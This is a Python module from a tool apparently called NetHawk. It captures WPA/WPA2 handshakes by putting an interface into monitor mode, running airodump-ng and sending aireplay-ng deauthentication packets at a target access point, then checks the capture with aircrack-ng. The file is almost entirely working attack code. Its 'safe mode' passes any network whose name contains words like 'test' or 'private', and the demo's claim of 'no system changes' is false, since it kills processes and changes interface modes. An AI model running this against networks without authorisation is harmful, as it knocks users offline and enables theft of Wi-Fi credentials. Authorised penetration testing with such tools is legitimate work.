"""
NetHawk Handshake Capture Module
Production-ready handshake capture with deauth attacks and safety controls
"""

import os
import subprocess
import json
import time
import shutil
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import List, Optional, Dict, Any, Union

# Lazy import to avoid circular dependencies
def _get_logger():
    """Get logger instance lazily to avoid circular imports."""
    try:
        from nethawk.util.logger import get_logger
        return get_logger(name="nethawk.capture")
    except ImportError:
        # Fallback for when running as script
        import sys
        sys.path.insert(0, str(Path(__file__).parent.parent.parent))
        from nethawk.util.logger import get_logger
        return get_logger(name="nethawk.capture")


def current_time_str() -> str:
    """Get current timestamp as string."""
    return time.strftime("%Y%m%d_%H%M%S")


@dataclass
class HandshakeInfo:
    """Represents a captured handshake."""
    ssid: str
    bssid: str
    channel: int
    capture_file: str
    clients: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=current_time_str)
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for JSON serialization."""
        return asdict(self)
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'HandshakeInfo':
        """Create from dictionary."""
        return cls(**data)


@dataclass
class HandshakeCaptureResult:
    """Container for handshake capture results."""
    handshakes: List[HandshakeInfo] = field(default_factory=list)
    session_path: str = ""
    timestamp: str = field(default_factory=current_time_str)
    target_ssid: str = ""
    target_bssid: str = ""
    capture_duration: float = 0.0
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for JSON serialization."""
        return {
            "handshakes": [h.to_dict() for h in self.handshakes],
            "session_path": self.session_path,
            "timestamp": self.timestamp,
            "target_ssid": self.target_ssid,
            "target_bssid": self.target_bssid,
            "capture_duration": self.capture_duration
        }
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'HandshakeCaptureResult':
        """Create from dictionary."""
        handshakes = [HandshakeInfo.from_dict(h) for h in data.get("handshakes", [])]
        return cls(
            handshakes=handshakes,
            session_path=data.get("session_path", ""),
            timestamp=data.get("timestamp", ""),
            target_ssid=data.get("target_ssid", ""),
            target_bssid=data.get("target_bssid", ""),
            capture_duration=data.get("capture_duration", 0.0)
        )


def _is_safe_target(bssid: str, ssid: str = "") -> bool:
    """
    Check if target is safe for handshake capture (lab/private networks only).
    
    Args:
        bssid: Target BSSID to check
        ssid: Target SSID (optional)
        
    Returns:
        True if target appears to be safe for capture
    """
    # Check for common lab/test BSSID patterns
    safe_prefixes = [
        "00:11:22",  # Test vendor
        "aa:bb:cc",  # Example Corp
        "de:ad:be",  # Demo Company
        "02:00:00",  # Lab range
        "fe:80:00"   # Link-local
    ]
    
    bssid_lower = bssid.lower()
    for prefix in safe_prefixes:
        if bssid_lower.startswith(prefix.lower()):
            return True
    
    # Check for private network indicators
    if bssid_lower.startswith(("00:11:22", "aa:bb:cc", "de:ad:be")):
        return True
    
    # Check SSID for lab indicators
    lab_indicators = ["test", "lab", "demo", "local", "internal", "private"]
    ssid_lower = ssid.lower()
    for indicator in lab_indicators:
        if indicator in ssid_lower:
            return True
    
    return False


def _check_tools_available() -> Dict[str, bool]:
    """
    Check if required tools are available.
    
    Returns:
        Dictionary of tool availability
    """
    tools = {
        "airodump-ng": shutil.which("airodump-ng") is not None,
        "aireplay-ng": shutil.which("aireplay-ng") is not None,
        "airmon-ng": shutil.which("airmon-ng") is not None,
        "aircrack-ng": shutil.which("aircrack-ng") is not None
    }
    return tools


def set_monitor_mode(iface: str, enable: bool = True, logger: Optional[Any] = None) -> bool:
    """
    Enable or disable monitor mode on a wireless interface.
    
    Args:
        iface: Interface name
        enable: True to enable monitor mode, False to disable
        logger: Logger instance (optional)
        
    Returns:
        True if successful
    """
    if logger is None:
        logger = _get_logger()
    
    try:
        if enable:
            logger.info(f"Enabling monitor mode on {iface}")
            # Stop any conflicting processes
            subprocess.run(["airmon-ng", "check", "kill"], 
                         capture_output=True, timeout=10)
            # Start monitor mode
            result = subprocess.run(["airmon-ng", "start", iface], 
                                  capture_output=True, text=True, timeout=30)
        else:
            logger.info(f"Disabling monitor mode on {iface}")
            result = subprocess.run(["airmon-ng", "stop", iface], 
                                  capture_output=True, text=True, timeout=30)
        
        if result.returncode == 0:
            logger.info(f"Monitor mode {'enabled' if enable else 'disabled'} on {iface}")
            return True
        else:
            logger.error(f"Failed to {'enable' if enable else 'disable'} monitor mode: {result.stderr}")
            return False
            
    except subprocess.TimeoutExpired:
        logger.error(f"Timeout while {'enabling' if enable else 'disabling'} monitor mode")
        return False
    except Exception as e:
        logger.error(f"Error setting monitor mode: {e}")
        return False


def validate_handshake(cap_file: Path, logger: Optional[Any] = None) -> bool:
    """
    Validate if a .cap file contains a valid WPA/WPA2 handshake.
    
    Args:
        cap_file: Path to the capture file
        logger: Logger instance (optional)
        
    Returns:
        True if valid handshake found
    """
    if logger is None:
        logger = _get_logger()
    
    if not cap_file.exists():
        logger.error(f"Capture file not found: {cap_file}")
        return False
    
    try:
        # Use aircrack-ng to validate handshake
        result = subprocess.run(
            ["aircrack-ng", "-w", "/dev/null", str(cap_file)],
            capture_output=True,
            text=True,
            timeout=30
        )
        
        # Check output for handshake indicators
        output = result.stdout + result.stderr
        handshake_indicators = [
            "1 handshake",
            "handshake captured",
            "WPA (1 handshake)",
            "WPA2 (1 handshake)"
        ]
        
        for indicator in handshake_indicators:
            if indicator.lower() in output.lower():
                logger.info(f"Valid handshake found in {cap_file}")
                return True
        
        logger.warning(f"No valid handshake found in {cap_file}")
        return False
        
    except subprocess.TimeoutExpired:
        logger.error(f"Timeout while validating handshake in {cap_file}")
        return False
    except Exception as e:
        logger.error(f"Error validating handshake: {e}")
        return False


def deauth_attack(bssid: str, iface: str, count: int = 5, safe_mode: bool = True, logger: Optional[Any] = None) -> bool:
    """
    Send deauthentication packets to trigger handshake capture.
    
    Args:
        bssid: Target BSSID
        iface: Interface name
        count: Number of deauth packets to send
        safe_mode: If True, only allow lab/private networks
        logger: Logger instance (optional)
        
    Returns:
        True if successful
    """
    if logger is None:
        logger = _get_logger()
    
    # Safety check
    if safe_mode and not _is_safe_target(bssid):
        raise PermissionError(f"Safe mode enabled: target {bssid} not in lab/private network")
    
    # Check if aireplay-ng is available
    if not shutil.which("aireplay-ng"):
        logger.error("aireplay-ng not available")
        return False
    
    try:
        logger.info(f"Sending {count} deauth packets to {bssid}")
        cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid, iface]
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=30
        )
        
        if result.returncode == 0:
            logger.info(f"Deauth attack completed on {bssid}")
            return True
        else:
            logger.error(f"Deauth attack failed: {result.stderr}")
            return False
            
    except subprocess.TimeoutExpired:
        logger.error("Deauth attack timed out")
        return False
    except Exception as e:
        logger.error(f"Deauth attack error: {e}")
        return False


def capture_handshake(
    target_ssid: str,
    target_bssid: str,
    channel: int,
    iface: str,
    duration: int = 60,
    session_path: Optional[Path] = None,
    safe_mode: bool = True,
    logger: Optional[Any] = None
) -> HandshakeCaptureResult:
    """
    Capture WPA/WPA2 handshake for a target access point.
    
    Args:
        target_ssid: Target network SSID
        target_bssid: Target BSSID
        channel: Target channel
        iface: Network interface
        duration: Capture duration in seconds
        session_path: Path to session directory
        safe_mode: If True, only allow lab/private networks
        logger: Logger instance (optional)
        
    Returns:
        HandshakeCaptureResult with capture information
        
    Raises:
        PermissionError: If target is not safe and safe_mode is True
        RuntimeError: If required tools are not available
    """
    if logger is None:
        logger = _get_logger()
    
    logger.info(f"Starting handshake capture for {target_ssid} ({target_bssid})")
    logger.info(f"Channel: {channel}, Interface: {iface}, Duration: {duration}s")
    
    # Safety check
    if safe_mode and not _is_safe_target(target_bssid, target_ssid):
        raise PermissionError(f"Safe mode enabled: target {target_ssid} ({target_bssid}) not in lab/private network")
    
    # Check tool availability
    tools = _check_tools_available()
    if not tools["airodump-ng"]:
        raise RuntimeError("airodump-ng not available - install aircrack-ng package")
    
    # Setup session directory
    if session_path is None:
        try:
            from nethawk.session import create_session
            session_path = create_session("handshake_capture")
        except ImportError:
            session_path = Path("sessions") / f"session_{current_time_str()}"
    
    session_path = Path(session_path)
    handshakes_dir = session_path / "handshakes"
    handshakes_dir.mkdir(parents=True, exist_ok=True)
    
    # Prepare capture file
    cap_file = handshakes_dir / f"{target_ssid}_{current_time_str()}.cap"
    
    start_time = time.time()
    result = HandshakeCaptureResult(
        session_path=str(session_path),
        target_ssid=target_ssid,
        target_bssid=target_bssid
    )
    
    try:
        # Enable monitor mode
        if not set_monitor_mode(iface, enable=True, logger=logger):
            raise RuntimeError(f"Failed to enable monitor mode on {iface}")
        
        # Run airodump-ng to capture handshake
        logger.info(f"Starting airodump-ng capture on {iface}")
        cmd = [
            "airodump-ng",
            "--bssid", target_bssid,
            "--channel", str(channel),
            "--write", str(cap_file.with_suffix('')),  # Remove .cap extension for airodump
            iface
        ]
        
        logger.info(f"Running: {' '.join(cmd)}")
        
        # Start airodump-ng process
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Wait for specified duration
        try:
            process.wait(timeout=duration)
        except subprocess.TimeoutExpired:
            logger.info(f"Capture duration ({duration}s) completed, stopping airodump-ng")
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                logger.warning("airodump-ng did not stop gracefully, forcing kill")
                process.kill()
        
        # Check if capture file was created
        if not cap_file.exists():
            logger.error(f"airodump-ng did not create capture file: {cap_file}")
            return result
        
        # Validate handshake
        if validate_handshake(cap_file, logger):
            handshake_info = HandshakeInfo(
                ssid=target_ssid,
                bssid=target_bssid,
                channel=channel,
                capture_file=str(cap_file)
            )
            result.handshakes.append(handshake_info)
            logger.info(f"Valid handshake captured: {cap_file}")
        else:
            logger.warning(f"No valid handshake found in {cap_file}")
    
    except Exception as e:
        logger.error(f"Handshake capture failed: {e}")
        raise
    finally:
        # Disable monitor mode
        try:
            set_monitor_mode(iface, enable=False, logger=logger)
        except Exception as e:
            logger.warning(f"Failed to disable monitor mode: {e}")
    
    # Update result
    result.capture_duration = time.time() - start_time
    result.timestamp = current_time_str()
    
    # Save results
    results_file = session_path / "capture.json"
    with open(results_file, 'w') as f:
        json.dump(result.to_dict(), f, indent=2)
    
    logger.info(f"Handshake capture completed in {result.capture_duration:.2f} seconds")
    logger.info(f"Results saved to: {results_file}")
    
    return result


def run_handshake_capture(
    target_ssid: str,
    target_bssid: str,
    channel: int,
    iface: str = "wlan0",
    duration: int = 60,
    session_path: Optional[Path] = None,
    safe_mode: bool = True,
    use_deauth: bool = False,
    logger: Optional[Any] = None
) -> HandshakeCaptureResult:
    """
    Run complete handshake capture with optional deauthentication attack.
    
    Args:
        target_ssid: Target network SSID
        target_bssid: Target BSSID
        channel: Target channel
        iface: Network interface
        duration: Capture duration in seconds
        session_path: Path to session directory
        safe_mode: If True, only allow lab/private networks
        use_deauth: Whether to use deauth attack to trigger handshake
        logger: Logger instance (optional)
        
    Returns:
        HandshakeCaptureResult with capture information
    """
    if logger is None:
        logger = _get_logger()
    
    logger.info(f"Starting handshake capture for {target_ssid}")
    logger.info(f"Target: {target_bssid} on channel {channel}")
    logger.info(f"Interface: {iface}, Duration: {duration}s")
    logger.info(f"Safe mode: {safe_mode}, Deauth: {use_deauth}")
    
    # Perform deauth attack if requested
    if use_deauth:
        logger.info("Performing deauthentication attack to trigger handshake")
        deauth_attack(target_bssid, iface, count=5, safe_mode=safe_mode, logger=logger)
        time.sleep(2)  # Wait for clients to reconnect
    
    # Capture handshake
    result = capture_handshake(
        target_ssid=target_ssid,
        target_bssid=target_bssid,
        channel=channel,
        iface=iface,
        duration=duration,
        session_path=session_path,
        safe_mode=safe_mode,
        logger=logger
    )
    
    return result


def display_capture_results(result: HandshakeCaptureResult, logger: Optional[Any] = None) -> None:
    """
    Display handshake capture results in a formatted table.
    
    Args:
        result: HandshakeCaptureResult to display
        logger: Logger instance (optional)
    """
    if logger is None:
        logger = _get_logger()
    
    try:
        from rich.console import Console
        from rich.table import Table
        
        console = Console()
        
        # Display capture summary
        table = Table(title="Handshake Capture Results")
        table.add_column("SSID")
        table.add_column("BSSID")
        table.add_column("Channel")
        table.add_column("Capture File")
        table.add_column("Status")
        
        for handshake in result.handshakes:
            status = "Captured" if Path(handshake.capture_file).exists() else "Failed"
            table.add_row(
                handshake.ssid,
                handshake.bssid,
                str(handshake.channel),
                Path(handshake.capture_file).name,
                status
            )
        
        console.print(table)
        
        # Display summary
        console.print(f"\n[bold]Capture Summary:[/bold]")
        console.print(f"Target: {result.target_ssid} ({result.target_bssid})")
        console.print(f"Duration: {result.capture_duration:.2f} seconds")
        console.print(f"Handshakes captured: {len(result.handshakes)}")
        console.print(f"Session: {result.session_path}")
    
    except ImportError:
        # Fallback to simple text output if Rich is not available
        logger.info("Rich not available, using simple text output")
        
        print("\n=== Handshake Capture Results ===")
        print(f"Target: {result.target_ssid} ({result.target_bssid})")
        print(f"Duration: {result.capture_duration:.2f} seconds")
        print(f"Handshakes captured: {len(result.handshakes)}")
        
        for handshake in result.handshakes:
            print(f"  - {handshake.ssid} on channel {handshake.channel}")
            print(f"    File: {Path(handshake.capture_file).name}")


if __name__ == "__main__":
    """
    Demo script for testing handshake capture functionality.
    This demo uses safe targets to avoid making system changes.
    """
    try:
        from nethawk.session import create_session
    except ImportError:
        # Fallback for when running as script
        import sys
        sys.path.insert(0, str(Path(__file__).parent.parent.parent))
        from nethawk.session import create_session
    
    print("NetHawk Handshake Capture Module Demo")
    print("=" * 50)
    
    # Create a test session
    session_path = create_session("demo_capture")
    print(f"Created test session: {session_path}")
    
    # Test tool availability
    print("\nTesting tool availability...")
    tools = _check_tools_available()
    for tool, available in tools.items():
        status = "✓ Available" if available else "✗ Not available"
        print(f"  {tool}: {status}")
    
    # Test safety validation
    print("\nTesting safety validation...")
    test_targets = [
        ("TestNetwork", "00:11:22:33:44:55"),
        ("LabNetwork", "aa:bb:cc:dd:ee:ff"),
        ("ExternalNetwork", "08:00:27:12:34:56")
    ]
    
    for ssid, bssid in test_targets:
        safe = _is_safe_target(bssid, ssid)
        status = "Safe" if safe else "Unsafe"
        print(f"  {ssid} ({bssid}): {status}")
    
    # Test handshake capture (dry run)
    print("\nTesting handshake capture (dry run)...")
    try:
        result = run_handshake_capture(
            target_ssid="TestNetwork",
            target_bssid="00:11:22:33:44:55",
            channel=6,
            iface="wlan0",
            duration=10,
            session_path=session_path,
            safe_mode=True,
            use_deauth=False
        )
        
        print(f"Capture completed:")
        print(f"  - Target: {result.target_ssid} ({result.target_bssid})")
        print(f"  - Duration: {result.capture_duration:.2f} seconds")
        print(f"  - Handshakes: {len(result.handshakes)}")
        print(f"  - Session: {result.session_path}")
        
    except Exception as e:
        print(f"Handshake capture failed: {e}")
    
    print("\nDemo completed - no system changes made")